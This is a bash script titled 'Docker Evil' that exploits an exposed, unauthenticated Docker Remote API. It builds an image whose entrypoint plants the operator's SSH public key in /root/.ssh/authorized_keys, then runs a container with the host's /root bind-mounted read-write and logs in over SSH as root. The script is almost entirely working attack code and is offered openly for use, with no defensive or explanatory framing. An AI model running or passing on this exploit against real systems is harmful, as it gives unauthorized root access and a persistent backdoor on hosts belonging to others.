#!/bin/bash

#skiddie
# v2

echo "                   @@/.......(((((((#&@@.                            "
echo "               (#.........#((((((((((((((((@@                        "
echo "             @,.......  *((((  (((((((((((((((%@                     "
echo "            @@@@@&%###(  ((  #(((((((((((((((((((@(                  "
echo "           &((((((((((((#  ((((((((((((((((((((((((&(                "
echo "          @((((((((((((  ((  ((((((((((((((((((((((((@               "
echo "         ##((((((((((  ((((((  (((((((((((((((((((((((%&             "
echo "         @((#%%%%#((((((#%%%%%%#((((#%%%%%%#(((((#%%%%#(@            "
echo "         @(((((((((((((((((((((((((((((((((((((((((((((((@           "
echo "         ,.......................................,%@@#(((#%&&@@      "
echo "                        ,#//*          (/((((         @#((((((((%&   "
echo "                      ((##((/  ((((/(  (((#(#/       @((((##((((((@( "
echo "                       ##(((((,#(#(((  #((#(#%       @((((%.  .*     "
echo "                        /#  #.(#(#(((                @((((@          "
echo "                           ##(((/%                   *%(@,           "
echo "                          ###(///     #(((   #/(%,     *             "
echo "                            %(((/   ./((((((*(#(#(/                  "
echo "                                     #####( ##(#(((                  "
echo "                                       ((.     .(#/                  "
echo "________                 __                  ___________     .__.__   "
echo "\______ \   ____   ____ |  | __ ___________  \_   _____/__  _|__|  |  "
echo " |    |  \ /  _ \_/ ___\|  |/ // __ \_  __ \  |    __)_\  \/ /  |  |  "
echo " | __ /   (  <_> )  \___|    <\  ___/|  | \/  |    |_ /\\   /|  |  |__"
echo "/_______  /\____/ \___  >__|_ \\___  >__|    /_______  / \_/ |__|____/"
echo "        \/            \/     \/    \/                \/               "

## Looking for user's parameters along with the command
if [ $1 == "-h" ]
then
	echo -e "\n Insert the desired host and port: \n"
	read HOST

	echo -e "\nGetting image ID..."
	curl -s http://$HOST/images/json | json_pp | awk '/sha256:/ {print $3}' | tr -d '"' | tr -d ',' | cut -d ":" -f2,2 > /tmp/IMG_ID.dkr
	IMG_ID=$(head -n1 /tmp/IMG_ID.dkr)
	rm /tmp/IMG_ID.dkr
	echo -e "Done\n"


## Checking for SSH key file on default location, change here in case you have the SSH key on another path...
	bool=$(ls ~/.ssh/id_rsa.pub &> /dev/null; echo $?)
	if [ $bool -eq 0 ]
	then
		echo -e "Default SSH key path detected. Copying it...\n"
	else
		echo -e "No SSH key was found or it is not on the default path. Either modify the script or create a SSH key\n The script will end here..."
		sleep 1
## Error 2 == no SSH key found on default path. If you're going to change the script to look for the SSH key on another path, you need to coment out the "Checking for SSH key"
		exit 2
## Closing SSH key detection if
	fi

## Cleaning out this variable for later use
	unset bool

	echo "Getting thy SSH key..."
	RSA=$(cat ~/.ssh/id_rsa.pub | awk '/ssh-rsa/ {print $2}')
	echo -e "Done\n"

	echo "Writing Dockerfile..."
	echo -e "FROM $IMG_ID \nUSER root \nENTRYPOINT echo 'ssh-rsa "$RSA"' >> /root/.ssh/authorized_keys" > Dockerfile
	echo "Compressing Dockerfile...."

##	Checking the compression
		bool=$(tar -cf dockerevil.tar Dockerfile; echo $?)
		if [ $bool -eq 0 ]
		then
			echo -e "Compression done...\n"
			rm Dockerfile
		else
			## If you're having trouble here, try checking if the Dockerfile was indeed created. I didn't direct any error output here, so you can have a chance to see what's wrong if shit happens
			echo -e "Ooops... Looks like something went wrong while compressing the Dockerfile... I'm gonna go ahead and leave...\n"
			sleep 1
			## Error 3 == Something went wrong during the compression of the Dockerfile
			exit 3
		## Closing the Check for compression success if statement
		fi

	 ## Building image
	echo "Building the image..."
	BUILD_ID=$(curl -s -XPOST -H "Content-type: application/x-tar" --data-binary @dockerevil.tar "http://$HOST/build" | awk '/built/ {print $3}' | sed 's/.\{5\}$//')
	echo "Done"

	## Creating image
	echo "Creating image..."
	IMG_ID=$(curl -H "Content-Type: application/json" -d '{"Image" : "'"$BUILD_ID"'", "Binds" : ["/root/:/root/:rw,z"]}' -XPOST "http://$HOST/containers/create" | awk -F ":" ' {print $2} '| awk -F "," ' {print $1}' | sed 's/"//g')
	echo "Done"
	rm dockerevil.tar

	## Starting image
	echo "Starting image"
	curl -s -XPOST http://$HOST/containers/$IMG_ID/start -v
	echo "Done"
	ssh_host=$(echo $HOST | awk -F ":" ' {print $1} ')
	ssh root@$ssh_host

else
	echo -e "\nThis program needs at least one parameter. Try --help\n"
fi
